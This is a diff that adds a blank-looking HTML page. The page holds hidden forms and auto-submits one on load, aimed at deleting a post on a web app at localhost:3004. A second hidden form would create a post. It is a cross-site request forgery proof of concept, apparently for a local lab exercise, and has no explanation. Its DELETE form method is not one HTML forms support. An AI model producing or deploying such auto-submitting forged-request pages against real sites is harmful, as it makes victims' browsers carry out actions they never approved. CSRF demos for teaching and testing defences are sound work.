@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title></title>
+</head>
+
+<body onload="document.deleteUserForm.submit()">
+    <form style="display: none" name="postForm" method="POST" action="http://localhost:3004/posts">
+        <input type="text" name="content" value="http://localhost:1912">
+    </form>
+
+    <form style="display: none" name="deleteUserForm" method="DELETE" action="http://localhost:3004/posts/193">
+        <input type="text" name="content" value="http://localhost:1912">
+    </form>
+</body>
+
+</html>
